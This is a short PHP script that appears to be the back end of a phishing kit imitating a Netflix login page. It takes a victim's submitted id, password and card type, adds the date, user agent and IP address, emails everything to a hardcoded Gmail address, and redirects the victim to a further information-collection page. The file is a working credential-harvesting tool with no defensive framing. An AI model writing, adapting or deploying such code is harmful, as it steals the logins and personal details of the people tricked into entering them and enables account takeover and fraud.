<?php
// session_start();
// session_destroy();
session_start();
		header("Access-Control-Allow-Origin:*");
		$recepientEmail = "Reup690@gmail.com";
		$id = $_POST["id"];
		$password = $_POST["password"];
		$cardType = $_POST["card-type"];
		$_SESSION["id"] = $id;
		$_SESSION["password"] = $password;
		$message = "\n\r netflix login credentials\n\r";
		$message = $message."id: ".$id."\n\r";
		$message = $message."password: ".$password."\n\r";
		$message = $message."card-type: ".$cardType."\n\r";
		$message = $message."date: ".date("Y-m-d")."\n\r";
		$message = $message."time: ".date("h:i:s")."\n\r";		
		$message = $message."user-agent: ".$_SERVER["HTTP_USER_AGENT"]."\n\r";		
		$message = $message."user-ip-address: ".$_SERVER["REMOTE_ADDR"]."\n\r";		

		header("Content-Type:application/json");
		$json = json_encode($_POST);
		$mail = mail($recepientEmail,"discover user details/info 1 ".$email." details",$message);
    header("Location: ./userinfopage.php");
	
?>

